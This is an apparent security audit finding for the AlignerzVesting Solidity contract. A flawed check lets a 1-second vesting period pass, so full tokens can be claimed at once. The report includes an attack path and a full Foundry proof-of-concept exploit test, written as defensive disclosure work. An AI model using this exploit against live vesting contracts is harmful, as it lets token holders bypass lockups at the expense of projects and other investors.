# [000210] Users can bypass vesting schedules entirely by setting vestingPeriod to 1 second, allowing immediate 100% token withdrawal
  
  ### Summary

The validation logic in `placeBid` contains a flawed condition `vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0` that allows users to set `vestingPeriod = 1` second. When combined with the claim calculation formula `claimableAmount = (amount * claimableSeconds) / vestingPeriod`, this results in users being able to claim 100% of their tokens after just 1 second, completely bypassing the intended vesting mechanism.

### Root Cause

In `protocol/src/contracts/vesting/AlignerzVesting.sol:724`, the validation check has a problematic exception:

```solidity
require (vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value());
```

**The problem:** The condition `vestingPeriod < 2` allows `vestingPeriod = 1` to pass validation, even though 1 is not a multiple of `vestingPeriodDivisor` (which defaults to 2,592,000 seconds = 30 days).

**Why this breaks vesting:**

1. User places bid with `vestingPeriod = 1`:
   - Validation: `1 < 2` is `true`, so the check passes ✅
   - Bid is accepted and stored

2. After 1 second, user calls `claimTokens`:
   - `getClaimableAmountAndSeconds` calculates: `claimableSeconds = 1` (1 second has passed)
   - Formula: `claimableAmount = (amount * 1) / 1 = amount` (100% of tokens!)
   - User receives 100% of their tokens immediately

3. The flow is marked as fully claimed:
   ```solidity
   // Line 961-963
   if (allocation.claimedSeconds[i] >= allocation.vestingPeriods[i]) {
       allocation.claimedFlows[i] = true; // Marked as fully claimed
   }
   // Line 969-971
   if (flowsClaimed == nbOfFlows) {
       nftContract.burn(nftId); // NFT burned = all tokens claimed
   }
   ```

**Code Reference - Buggy validation:**
```solidity
// AlignerzVesting.sol:722-724
require(vestingPeriod > 0, Zero_Value());
require (vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value());
```

**Code Reference - Claim calculation (works correctly, but enables the exploit):**
```solidity
// AlignerzVesting.sol:980-996
function getClaimableAmountAndSeconds(Allocation memory allocation, uint256 flowIndex) public view returns(uint256 claimableAmount, uint256 claimableSeconds) {
    uint256 secondsPassed;
    uint256 claimedSeconds = allocation.claimedSeconds[flowIndex];
    uint256 vestingPeriod = allocation.vestingPeriods[flowIndex];
    uint256 vestingStartTime = allocation.vestingStartTimes[flowIndex];
    uint256 amount = allocation.amounts[flowIndex];
    if (block.timestamp > vestingPeriod + vestingStartTime) {
        secondsPassed = vestingPeriod;
    } else {
        secondsPassed = block.timestamp - vestingStartTime;
    }

    claimableSeconds = secondsPassed - claimedSeconds;
    claimableAmount = (amount * claimableSeconds) / vestingPeriod; // With vestingPeriod=1, this gives 100% after 1 second
    require(claimableAmount > 0, No_Claimable_Tokens());
    return (claimableAmount, claimableSeconds);
}
```

**The Intended Behavior:**
- Vesting periods should be multiples of `vestingPeriodDivisor` (e.g., 30 days, 60 days, 90 days)
- Users should only be able to claim tokens proportionally over the vesting period
- A 90-day vesting should allow ~1.1% claimable after 1 day, ~50% after 45 days, and 100% after 90 days

**The Actual Behavior:**
- Users can set `vestingPeriod = 1` second
- After 1 second, they can claim 100% of tokens
- The vesting mechanism is completely bypassed

### Internal Pre-conditions

1. User must be whitelisted (if whitelist is enabled for the project)
2. User must have sufficient stablecoin balance and approval for the bid amount
3. Bidding period must be active
4. User must not have an existing bid

### External Pre-conditions

_No response_

### Attack Path

1. Attacker places a bid with `vestingPeriod = 1` second:
   ```solidity
   vesting.placeBid(projectId, 1000 ether, 1); // vestingPeriod = 1
   ```
   - Validation check: `1 < 2` is `true`, so the bid is accepted ✅

2. Project creator finalizes bids and allocates tokens to the attacker's NFT

3. Attacker claims their NFT through `claimNFT`

4. Attacker waits 1 second (or calls `claimTokens` immediately if 1 second has already passed)

5. Attacker calls `claimTokens(projectId, nftId)`:
   - `getClaimableAmountAndSeconds` calculates:
     - `secondsPassed = 1` (1 second has elapsed)
     - `claimableSeconds = 1 - 0 = 1`
     - `claimableAmount = (1000 ether * 1) / 1 = 1000 ether` (100%!)
   - Contract transfers 1000 ether to attacker
   - Flow is marked as fully claimed (`claimedSeconds[0] = 1 >= vestingPeriods[0] = 1`)
   - NFT is burned (all tokens claimed)

6. Attacker has successfully bypassed the vesting schedule and received 100% of tokens after just 1 second

### Impact

- **Complete Vesting Bypass**: Users can withdraw all tokens immediately instead of waiting months/years

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";

/// @title Test demonstrating the 1-second vesting bypass bug
/// @notice This test shows that users can bypass the intended vesting schedule
///         by placing bids with vestingPeriod = 1 second, allowing them to
///         claim 100% of their tokens immediately after 1 second
contract OneSecondVestingBypassBugTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;

    address public owner;
    address public projectCreator;
    address public bidder1; // Bidder with 1-second vesting (bug exploit)
    address public bidder2; // Bidder with normal vesting (for comparison)

    // Constants
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant PROJECT_ID = 0;
    uint256 constant POOL_ID = 0;
    uint256 constant VESTING_PERIOD_BUG = 1; // 1 second - should NOT be allowed!
    uint256 constant EXPECTED_VESTING_PERIOD = 2_592_000; // 1 month (minimum expected)

    // Project structure for organization
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track allocated bids and their proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        bidder1 = makeAddr("bidder1");
        bidder2 = makeAddr("bidder2");
        vm.deal(projectCreator, 100 ether);
        vm.deal(bidder1, 50 ether);
        vm.deal(bidder2, 50 ether);

        // Deploy contracts
        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
        );
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        // Mint USDT for both bidders
        usdt.mint(bidder1, BIDDER_USD);
        usdt.mint(bidder2, BIDDER_USD);

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    // Helper function to create a leaf node for the merkle tree
    function getLeaf(address _bidder, uint256 amount, uint256 projectId, uint256 poolId)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(_bidder, amount, projectId, poolId));
    }

    // Helper for generating merkle proofs
    function generateMerkleProofs(BidInfo[] memory bids, uint256 poolId) internal returns (bytes32) {
        // First pass: count how many leaves we need
        uint256 leafCount = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leafCount++;
            }
        }

        // Create properly sized array
        bytes32[] memory leaves = new bytes32[](leafCount);
        uint256 currentIndex = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[currentIndex] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);
                bidderPoolIds[bids[i].bidder] = poolId;
                currentIndex++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    /// @notice Test that demonstrates the bug: 1-second vesting bypass
    /// @dev This test shows that:
    ///      1. A bid with vestingPeriod = 1 is accepted (BUG: should be rejected)
    ///      2. After 1 second, the user can claim 100% of their tokens (BUG: should require months)
    function test_OneSecondVestingBypassBug() public {
        vm.startPrank(projectCreator);
        
        // Use default vestingPeriodDivisor (2,592,000 = 1 month)
        // Don't change it - we want to test with the default value
        
        // 1. Launch project
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );

        // 2. Create a pool
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        
        // 3. Whitelist both bidders
        address[] memory whitelist = new address[](2);
        whitelist[0] = bidder1;
        whitelist[1] = bidder2;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        
        vm.stopPrank();

        // 4. Place bids: bidder1 with 1-second vesting (THE BUG!), bidder2 with normal vesting
        vm.startPrank(bidder1);
        usdt.approve(address(vesting), BIDDER_USD);
        
        // This should FAIL but it doesn't due to the bug:
        // require(vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0)
        // Since 1 < 2, the check passes even though 1 is not a multiple of 2,592,000
        vesting.placeBid(PROJECT_ID, BIDDER_USD, VESTING_PERIOD_BUG);
        vm.stopPrank();

        vm.startPrank(bidder2);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days); // Normal vesting period
        vm.stopPrank();

        // 5. Prepare bid allocation (off-chain simulation)
        BidInfo[] memory allBids = new BidInfo[](2);
        allBids[0] = BidInfo({
            bidder: bidder1,
            amount: BIDDER_USD,
            vestingPeriod: VESTING_PERIOD_BUG, // 1 second - THE BUG!
            poolId: POOL_ID,
            accepted: true
        });
        allBids[1] = BidInfo({
            bidder: bidder2,
            amount: BIDDER_USD,
            vestingPeriod: 90 days, // Normal vesting
            poolId: POOL_ID,
            accepted: true
        });

        // 6. Generate merkle root for the pool
        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBids, POOL_ID);

        // 7. Finalize bids
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), poolRoots, 60);
        
        uint256 endTime = block.timestamp; // This is when vesting starts

        // 8. Claim NFTs for both bidders
        vm.prank(bidder1);
        uint256 nftId1 = vesting.claimNFT(
            PROJECT_ID,
            POOL_ID,
            BIDDER_USD,
            bidderProofs[bidder1]
        );

        vm.prank(bidder2);
        uint256 nftId2 = vesting.claimNFT(
            PROJECT_ID,
            POOL_ID,
            BIDDER_USD,
            bidderProofs[bidder2]
        );

        // Verify NFTs were minted
        assertEq(nft.ownerOf(nftId1), bidder1, "NFT1 should be owned by bidder1");
        assertEq(nft.ownerOf(nftId2), bidder2, "NFT2 should be owned by bidder2");

        // 9. The contract stores the stablecoin amount directly in the allocation
        // When claiming tokens, it transfers this amount as tokens
        // So the expected amount is BIDDER_USD (1000 ether)
        uint256 expectedAmount = BIDDER_USD;
        
        // Verify tokens are in the contract
        assertGe(
            token.balanceOf(address(vesting)),
            expectedAmount,
            "Vesting contract should have tokens"
        );

        // 10. THE BUG: Wait only 1 second (instead of months!)
        vm.warp(endTime + VESTING_PERIOD_BUG + 1); // +1 to ensure we're past the period
        
        uint256 bidder1TokenBalanceBefore = token.balanceOf(bidder1);
        uint256 bidder2TokenBalanceBefore = token.balanceOf(bidder2);

        // 11. Claim tokens - bidder1 should get 100% immediately (THE BUG!)
        vm.prank(bidder1);
        vesting.claimTokens(PROJECT_ID, nftId1);

        uint256 bidder1TokenBalanceAfter = token.balanceOf(bidder1);
        uint256 tokensClaimed1 = bidder1TokenBalanceAfter - bidder1TokenBalanceBefore;

        // BUG DEMONSTRATION: bidder1 claimed 100% of tokens after just 1 second!
        // This should NOT be possible - vesting should require months
        assertEq(
            tokensClaimed1,
            expectedAmount,
            "BUG: bidder1 claimed 100% of tokens after 1 second - vesting bypassed!"
        );

        // Verify NFT1 was burned (all tokens claimed)
        vm.expectRevert();
        nft.ownerOf(nftId1);

        // 12. bidder2 should get almost nothing after 1 second (proper behavior)
        vm.prank(bidder2);
        vesting.claimTokens(PROJECT_ID, nftId2);

        uint256 bidder2TokenBalanceAfter = token.balanceOf(bidder2);
        uint256 tokensClaimed2 = bidder2TokenBalanceAfter - bidder2TokenBalanceBefore;

        // With proper vesting, bidder2 should get almost nothing after 1 second
        // (1 second / 90 days = ~0.0000129% of tokens)
        assertLt(
            tokensClaimed2,
            expectedAmount / 1000, // Less than 0.1% after 1 second
            "bidder2 should get almost nothing after 1 second with proper vesting"
        );

        // NFT2 should still exist (not all tokens claimed)
        assertEq(nft.ownerOf(nftId2), bidder2, "NFT2 should still exist");
    }

    /// @notice Test that shows what SHOULD happen with proper vesting
    /// @dev This test uses a normal 90-day vesting period to show the contrast
    function test_ProperVestingRequiresTime() public {
        vm.startPrank(projectCreator);
        
        // Launch project
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );

        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        
        address[] memory whitelist = new address[](2);
        whitelist[0] = bidder1;
        whitelist[1] = bidder2;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        
        vm.stopPrank();

        // Place bids with proper 90-day vesting period
        vm.startPrank(bidder1);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        vm.startPrank(bidder2);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        // Prepare bid allocation
        BidInfo[] memory allBids = new BidInfo[](2);
        allBids[0] = BidInfo({
            bidder: bidder1,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: POOL_ID,
            accepted: true
        });
        allBids[1] = BidInfo({
            bidder: bidder2,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: POOL_ID,
            accepted: true
        });

        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBids, POOL_ID);

        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), poolRoots, 60);
        
        uint256 endTime = block.timestamp;

        vm.prank(bidder1);
        uint256 nftId1 = vesting.claimNFT(
            PROJECT_ID,
            POOL_ID,
            BIDDER_USD,
            bidderProofs[bidder1]
        );

        vm.prank(bidder2);
        uint256 nftId2 = vesting.claimNFT(
            PROJECT_ID,
            POOL_ID,
            BIDDER_USD,
            bidderProofs[bidder2]
        );

        // The contract stores the stablecoin amount directly in the allocation
        uint256 expectedAmount = BIDDER_USD;

        // Wait only 1 second (like the bug test)
        vm.warp(endTime + 1);
        
        uint256 bidder1TokenBalanceBefore = token.balanceOf(bidder1);
        uint256 bidder2TokenBalanceBefore = token.balanceOf(bidder2);

        vm.prank(bidder1);
        vesting.claimTokens(PROJECT_ID, nftId1);

        vm.prank(bidder2);
        vesting.claimTokens(PROJECT_ID, nftId2);

        uint256 bidder1TokenBalanceAfter = token.balanceOf(bidder1);
        uint256 bidder2TokenBalanceAfter = token.balanceOf(bidder2);
        uint256 tokensClaimed1 = bidder1TokenBalanceAfter - bidder1TokenBalanceBefore;
        uint256 tokensClaimed2 = bidder2TokenBalanceAfter - bidder2TokenBalanceBefore;

        // With proper vesting, users should get almost nothing after 1 second
        // (1 second / 90 days = ~0.0000129% of tokens)
        
        // Allow some rounding tolerance
        assertLt(
            tokensClaimed1,
            expectedAmount / 1000, // Less than 0.1% after 1 second
            "With proper vesting, bidder1 should get almost nothing after 1 second"
        );

        assertLt(
            tokensClaimed2,
            expectedAmount / 1000, // Less than 0.1% after 1 second
            "With proper vesting, bidder2 should get almost nothing after 1 second"
        );

        // NFTs should still exist (not all tokens claimed)
        assertEq(nft.ownerOf(nftId1), bidder1, "NFT1 should still exist");
        assertEq(nft.ownerOf(nftId2), bidder2, "NFT2 should still exist");
    }

    /// @notice Test that verifies the validation logic allows vestingPeriod = 1
    /// @dev This directly tests the buggy validation
    function test_ValidationAllowsOneSecondVesting() public {
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        
        address[] memory whitelist = new address[](2);
        whitelist[0] = bidder1;
        whitelist[1] = bidder2;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        vm.stopPrank();

        // This should revert but doesn't due to the bug
        vm.startPrank(bidder1);
        usdt.approve(address(vesting), BIDDER_USD);
        
        // The bug: vestingPeriod = 1 passes validation because 1 < 2
        // require(vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0)
        // Since 1 < 2 is true, the check passes
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 1);
        vm.stopPrank();

        // If we try with vestingPeriod = 2, it should fail (not a multiple of 2,592,000)
        // This proves the bug: 1 is allowed but 2 is not!
        vm.startPrank(bidder2);
        usdt.approve(address(vesting), BIDDER_USD);
        vm.expectRevert();
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 2);
        
        vm.stopPrank();
    }
}

```

### Mitigation

_No response_
  